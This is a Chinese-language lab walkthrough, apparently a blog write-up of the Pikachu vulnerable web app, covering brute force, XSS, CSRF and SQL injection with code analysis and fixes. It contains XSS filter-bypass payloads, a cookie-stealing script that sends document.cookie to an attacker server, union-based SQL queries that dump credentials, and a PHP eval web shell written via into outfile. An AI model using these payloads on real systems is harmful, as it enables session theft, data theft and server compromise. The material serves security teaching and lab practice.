---

typora-copy-images-to: 图片
typora-root-url: ./
---

# 一、暴力破解

Burte Force（暴力破解）概述

​             “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。         

​             理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：

​              1.是否要求用户设置复杂的密码；
​             2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
​             3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
​             4.是否采用了双因素认证；
​             ...等等。

## 1、基于表单的暴力破解

a、提交数据

![1568213840918](/图片/1568213840918.png)

b、抓包进行爆破

![1568215095203](/图片/1568215095203.png)

![1568215114930](/图片/1568215114930.png)

c、看响应数据包长度

![1568215188316](/图片/1568215188316.png)

d、爆出密码为123456

![1568215234863](/图片/1568215234863.png)

## 2、验证码绕过(on server)

a、有些认证码机制造成浏览器提交数据后页面没刷新验证码就还在有效期中可以重复使用，使用bursuite拦截发送到repeater,多次发送请求相同的验证码果然可以重复使用。

![1568618135365](/图片/1568618135365.png)

b、使用发送到intruder添加paload进行爆破

![1568618273695](/图片/1568618273695.png)

![1568618313203](/图片/1568618313203.png)

3、爆破成功

![1568618412054](/图片/1568618412054.png)

## 3、验证码绕过(on client)

前端绕过是最不可靠的，使用bursuit抓包可以随意修改请求数据，绕过前端限制。

a、直接抓包，有了这个请求包后，验证码是可以不需要的

![1568618656858](/图片/1568618656858.png)

b、扔到intruder爆破：

![1568619024697](/图片/1568619024697.png)

![1568619012983](/图片/1568619012983.png)

c、爆出账户密码

![1568619093940](/图片/1568619093940.png)

## 4、token防爆破?

每次请求后token都是会改变的，这是否就意味着不可爆破？实际上我们是可以获取token的，把token加进paload进行密码爆破。

a、首先抓包扔到intruder，配置positions

![1568624869473](/图片/1568624869473.png)

b、点击Options,设置线程为1

![1568625168055](/图片/1568625168055.png)

添加Grep-Extract

![1568625201767](/图片/1568625201767.png)

指定token并复制下来，点击ok保存

![1568625270482](/图片/1568625270482.png)

![1568625405872](/图片/1568625405872.png)

redirections设置为always

![1568625419009](/图片/1568625419009.png)

c、接下来设置payloads

![1568625531546](/图片/1568625531546.png)

payload2为token,b把之前复制的token填入initial payload里面

![1568625574535](/图片/1568625574535.png)

d、开始爆破，爆破成功

![1568625717579](/图片/1568625717579.png)

# 二、Cross-Site Scripting

​		Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
​         1.反射性XSS;
​          2.存储型XSS;
​          3.DOM型XSS;
​          XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
​            因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
​            输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
​            输出转义：根据输出点的位置对输出到前端的内容进行适当转义。
​          对于过滤，我们会通过各种方法去绕过:

​           前端过滤绕过：抓包拦截改包

​           大小写绕过：<ScipT>alert(/xss/)</SCipt>

​            双写绕过：<scr<script>ipt>alert(/xss/)</s</script>cript>

​            注释干扰：<sc<!--content-->ript>alert(/xss/)</scr<!--content-->ipt>

​            编码绕过：依据前端编码解码机制

## 1、反射型xss(get)



### 1）漏洞验证：

页面只有一个输入框并设置了长度限制，随便输入一个字符，并在页面上返回字符，在message参数直接提交payload:<script>alert(1)</script>。

![1568704670690](/图片/1568704670690.png)

其他一些有趣的payload:

<a href=""  onclick=alert("xss")>type<a>
<img src='' onerror=alert("xss")>

<script>window.location='http://1.1.1.1'</script＞
<script>document.location.href="http://www.evil.com"</script>
<iframe src="http://1.1.1.1/victim" height = "0" width = "0"></iframe>
<srcipt>new.Image.src="192.168.1.104/c.php?output="+document.cookie</script>
<script>document.body.innerHTML="<div stytle=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1>"</script>
### 2）漏洞利用

#### a、窃取cookie

首先你得有个服务器，在服务器根目录下新建一个a.js脚本：

var img = new Image()
img.src = "http://你的服务器ip/cookies.php?cookie="+document.cookie;

然后通过xss诱导受害者访问你这个a.js，paload为<script src="http://你的ip/a.js"></script>,如果被访问到，你就可以在服务日志获取到受害者的cookie。

![1569133272540](/图片/1569133272540.png)

![1569133321734](/图片/1569133321734.png)

### 3）代码分析

服务器获取用户通过get提交过来的message,没有过滤就通过字符串拼接赋值给html，并且没有做任何编码处理就打印出来。

![1568717795251](/../../../hacker%20book/blog/pikachu/%E5%9B%BE%E7%89%87/1568717795251.png)

![1568717963826](/../../../hacker%20book/blog/pikachu/%E5%9B%BE%E7%89%87/1568717963826.png)

### 4）代码修复

使用htmlspecialchars将特殊字符转换成html实体：

![1569134982192](/图片/1569134982192.png)

修复后再攻击发现无法实现弹框，并且paload被编码成html实体

![1569135036924](/图片/1569135036924.png)

![1569135164026](/图片/1569135164026.png)

## 2、反射型xss(post)

这里的反射型xss(post)跟get的都是一样的，只是请求方式不一样，所以也不废话那么多。

### 1）漏洞验证

这里要先登录

![1569136278832](/图片/1569136278832.png)

然后输入paloads，验证成功

![1569136374273](/图片/1569136374273.png)



## 3、存储型xss

​        攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。它一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

###       1）漏洞验证

直接在留言板上提交恶意代码发现，访问页面直接执行了恶意代码

![1569154820234](/图片/1569154820234.png)       

### 2）代码分析

不做任何过滤直接写入数据库

![1569225158281](/图片/1569225158281.png)

不做实体编码直接输出到前端页面上

![1569225377407](/图片/1569225377407.png)

### 3）代码修复

![1569225629901](/图片/1569225629901.png)

## 4、DOM型xss

DOM xss是基于dom文件对象模型的，前端脚本通过dom动态修改页面，由于不予服务端运行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。常见的可以操作的dom对象有：url、location、referrer等。dom型的xss比较特殊，是一种基于dom树的xss，服务器端经常使用document.body.innertHtml等动态函数生成HTML页面，如果这些函数在引用某些变量时没有进行过滤检查，就会产生dom型的xss。dom型的xss可能是存储型的也可能是反射性的。

### 1）漏洞验证

碰到一个输入框一般情况下，我会直接输入几个字符，然后查看源代码，查看出现在哪个地方

![1569228526687](/图片/1569228526687.png)

![1569228544012](/图片/1569228544012.png)

并没有发现输入的字符串，然后就考虑dom型的xss，提交输入的内容后有个what do you see,然后在源代码发现了这个![1569228933416](/图片/1569228933416.png)

输入的内容嵌入到a标签里面，我们闭合掉引号形成paload。

![1569229377388](/图片/1569229377388.png)

![1569229105926](/图片/1569229105926.png)

### 2）代码分析

DOM型的xss恶意代码没有经过服务器器，是直接经过js处理的。

![1569291505129](/图片/1569291505129.png)

### 3）代码修复

xss修复一般想到的是转义，转义一般比过滤更加可靠，在php中有现成的htmlspecialchars函数对字符串进行转义，而js似乎没有有现成的函数进行转义，尝试使用正则表达式编写一个转义函数实现转义。

![1569293570398](/图片/1569293570398.png)

## 5、DOM型xss-x

打开页面查看源代码，操作基本跟上节差不多

![1569294676460](/图片/1569294676460.png)

先输入paload：' onclick="alert(1)"，点击[有些费尽心机想要忘记的事情,后来真的就忘掉了]，再点击[就让往事都随风,都随风吧]

![1569294731611](/图片/1569294731611.png)

## 6、xss之盲打

如何称之盲打，是因为你无法在攻击页面确认是否攻击成功，从这页面中看是提交看法建议的页面，提交的数据很可能会在后台显示。

![1569295586317](/图片/1569295586317.png)

![1569295634384](/图片/1569295634384.png)

### 1）代码分析

不做任何过滤

![1569295747591](/图片/1569295747591.png)

不做任何转义的输出

![1569295952713](/图片/1569295952713.png)

## 7、xss之过滤

### 1）漏洞验证

正常输入<script>alert(1)</script>发现被过滤掉了，只剩一个'>',难道其他字符全被过滤掉了？尝试单输入<,发现又没有被吃掉，猜想过滤的不是特定字符，而是某些符合规则的字符串组合。尝试大小写绕过，<Script>alert(1)</Script>，发现攻击成功，后来我发下<img src="" onerror="alert(1)">这个 也是可以绕过的，这个过滤是搞笑的吧，看下源码。

![1569296673960](/图片/1569296673960.png)

### 2）源码分析

发现是一个简单的正则过滤，怪不得<img src="" onerror="alert(1)">直接可以 绕过。

![1569296855976](/图片/1569296855976.png)

## 8、xss之htmlspecialchars

之前以为转义是很安全的，现在发现转义后不一定会完全不存在xss漏洞，比如单引号没有被转义，在一定情况下是会存在xss漏洞的。

### 1）漏洞验证

这里使用单引号即可绕过转义：' onclick='alert(1)'

![1569304906691](/图片/1569304906691.png)

### 2）代码分析

这里html转义后字符串结合a标签输出到html页面上，这时利用单引号没有被转义实现攻击。加上ENT_QUOTES参数可以对单引号进行转义，htmlspecialchars($_GET['message'],ENT_QUOTES)

![1569305212126](/图片/1569305212126.png)

## 9、xss之href输出

### 1）漏洞验证

打开页面尝试攻击，发现特殊字符全部被转义，包括单引号，估计使用了htmlspecialchars($_GET['message'],ENT_QUOTES)。但看源代码发现输入内容被输出到a标签的herf属性中。意味着可以尝试伪协议绕过javascript:alert(1)。

![1569306640860](/图片/1569306640860.png)

### 2）代码分析

虽然做了彻底的转义，但输出在a标签的herf中，没有做协议的过滤。

![1569306728168](/图片/1569306728168.png)

### 3）代码修复

设置href只允许http,https协议。

![1569307505399](/图片/1569307505399.png)

## 10、xss之js输出

### 1）漏洞验证

打开页面输入数据，查看源代码，发现在js里面出现，然后构造正确的语法就可以实现攻击了，paload:  ';alert(1);$a='

![1569307889422](/图片/1569307889422.png)

### 2）代码分析

php获取message并赋值给jsvar，然后输出到页面的js中

![1569308314825](/图片/1569308314825.png)

![1569308028645](/图片/1569308028645.png)

### 3）代码修复

这里讲输入动态的生成到了js中,形成xss，javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义，这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。所以在JS的输出点应该使用\对特殊字符进行转义。

## 11、总结

对于xss的防范总的来说从两个方面来考虑，输入进行过滤和输出进行转义。

在这里只是介绍各种情况的xss和修复，并没有介绍很深各种过waf姿势，只有8和9有点意思，在之后完成这个教程会单独把xss拿出来研究各种绕过。

# 三、CSRF

Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one
click"攻击。网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：
--对敏感信息的操作增加安全的token；
--对敏感信息的操作增加安全的验证码；
--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。

## 1、CSRF(get)

### 1）漏洞验证

首先使用用户登录，修改个人信息，提交抓包发现，是以get方式提交的并且与提交的数据一样，这个操作很可能没有做任何保护。

![1569326032807](/图片/1569326032807.png)

![1569326124173](/图片/1569326124173.png)

burpsuit里面有一个csrf的利用模块，右击要利用的链接选择CSRF Poc，就会生成一个利用的页面，把这个页面的的链接发给其他用户，如果其他用户在浏览器的cookie还有效的话就会执行这个操作。

![1569326500749](/图片/1569326500749.png)

![1569326544860](/图片/1569326544860.png)

我们登陆个用户，查看信息

![1569326687763](/图片/1569326687763.png)

访问http://127.0.0.1:8080/show/72/o88nuxcojwghvotyhikk7nlzd7lql66l这个poc页面

点击提交：

![1569326830941](/图片/1569326830941.png)

发现kobe的信息被改。

![1569326782564](/图片/1569326782564.png)

## 2、CSRF(post)

post型的操作跟get的也差不多，废话就不多说了

## 3、CSRF Token

  同样的操作发现无法修改，原因是提交的数据带有token.

![1569327494379](/图片/1569327494379.png)

点击修改个人信息按钮后，服务器会返回一个个人信息的表单页面。表单会嵌入一个隐藏的`<input />`标签，标签的`value`属性值为服务器端生成并存储在Session中的token，表单数据被提交时，token也会被提交到服务器。当填好个人信息的表单，点击提交后，服务器不仅检查信息是否有空值，还会将表单提交过来的token值也Session中的token值作对比，对比不通过不会执行个人信息修改操作。

![1569327619214](/图片/1569327619214.png)

![1569327671543](/图片/1569327671543.png)

## 4、总结

scrf防御思路：

1）验证码：对某些重要的操作，使用验证码验证，验证码一方面避免了身份认证信息在不知情的情况下被使用（因为与服务器有交互），另一方面攻击者在不知道验证码参数的值也无法完成攻击。缺点是用户体验有点差。

2）Referer Check：在HTTP请求消息头中有一个`Referer`头部，该头部的值记录着是从哪个页面（URL）跳转过来的。检查Referer也起到一定的作用，缺点是服务器不是任何时候都能获取的`Referer`的值，有时候出于安全考虑，限制了`Referer`的发送。

3）Token：Token是一串足够长且复杂的随机数，Token防御CSRF的本质就是让请求参数不可被预测，不能被预测也就意味着攻击者不能构造出恶意数据包请求。

## 四、Sql Inject(SQL注入)

SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
        1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
        2.使用参数化（Parameterized Query 或 Parameterized Statement）；
        3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!                     

## 1、数字型注入

抓包发现是post请求

![1569380321684](/图片/1569380321684.png)

把post提交的数据复制出来，使用hackbar发送数据：

![1569380818778](/图片/1569380818778.png)

给参数1加个单引号，报错说明此处存在注入，接下来输入id=1 and 1=1返回正确，id=1 and 1=2返回user id不存在，说明这是一个数字型注入。

![1569381193053](/图片/1569381193053.png)

使用order by判断列数，id=1 order by 2访问正常，id=1 order by 3报错，说明列数为2，接下来使用联合查询，id=1 union select 1,2爆出数据的位置，接下来可以做各种数据库的查询。

![1569382000133](/图片/1569382000133.png)

查询操作系统版本、mysql安装路径、mysql版本、当前数据库用户、数据库路径、当前数据库名、能否导出文件：

id=1 union select 1,concat_ws('，',@@version_compile_os,@@basedir,version(),user(),@@datadir,database(),@@secure_file_priv)

mysql中自带一个information_schema，记录着所有数据库的信息。

查询所有数据库：

id=1 union select 1,(select group_concat(schema_name) from information_schema.schemata)

查询pikachu数据库的表

id=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')

查询users表里面的字段

id=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='pikachu')

查询username和password的记录：

id=1 union select 1,(select group_concat(username,':',password) from pikachu.users)

拿到用户名密码。

## 2、字符型注入

打开页面，输入数据：参数name=1'报错，name=1' and '1'='1正常，name=1' and 1=1报错，从而证明这是一个字符型注入。

字符型跟整形的区别不大，只要注意引号的闭合就好了，注入方式跟上面一样。

name=1' union select 1,concat_ws('，',@@version_compile_os,@@basedir,version(),user(),@@datadir,database(),@@secure_file_priv)-- 

![1569408183114](/图片/1569408183114.png)

由于上面的已经讲了如何进行利用infomation_schema,这里就不重复了，我们发现以上查询中secure_file_priv为空值，那我们就来探究一下这个mysql文件读写问题吧。

### 1）secure_file_priv

secure_file_priv是控制mysql是否有读写的权限，它的值有三种：

​		a、secure_file_priv为null    表示不允许导入导出

​		b、secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹

​		c、secure_file_priv没有设置时，则表示没有任何限制

在mysql.ini文件里面可以修改。

### 2）load_file()、load data infile、into outfile

load_file()：导出文件

load data infile ：文件导入到数据库

into outfile：导入到文件

只有secure_file_priv为空值是这三个函数才有权限操作。

### 3）读取文件

name=1' union select 1,(load_file("D:/1.txt"))-- 

![1569465838334](/图片/1569465838334.png)

![1569465817909](/图片/1569465817909.png)

### 4）写入木马

name=1' union select 1,<?php eval($_POST['pass']);?> into outfile "D:/1.php"--%20

这里的<?php eval($_POST['pass']);?>一定要编码，不然语句一定会报错，因为里面有顿号，mysql就会认为到顿号就是一个完整的语句。所以最后的payload为：

name=1' union select 1,CHAR(60, 63, 112, 104, 112, 32, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 39, 112, 97, 115, 115, 39, 93, 41, 59, 63, 62) into outfile "../../WWW/1.php"-- 。我这里使用的是phpstudy搭建的环境，所以使用对目录结构，所以使用相对路径上传，并猜测位置使用菜刀连接。

不过不知道为什么前面会出现一连串的1。

![1569468926529](/图片/1569468926529.png)

![1569469902692](/图片/1569469902692.png)

![1569469954140](/图片/1569469954140.png)

连接成功。

## 3、搜索型注入

看到搜索型注入，搜索语句一般都是模糊搜索，其语法结构一般是这样子的 ：select * from xx where name like '%$name%'。所以在注入的时候注意闭合%‘即可。

输入单引号报错，判断存在注入，而且提示实在%附近，没有闭合![1569476998966](/图片/1569476998966.png)

输入name=1%'-- ，数据返回正常，结果与name=1一致，说明payload已经拼接了；

name=1%' order by 3 -- 正常 name=1%' order by 4 -- 报错，说明列数为3。接下来不多说，攻击方法跟之前的一样。

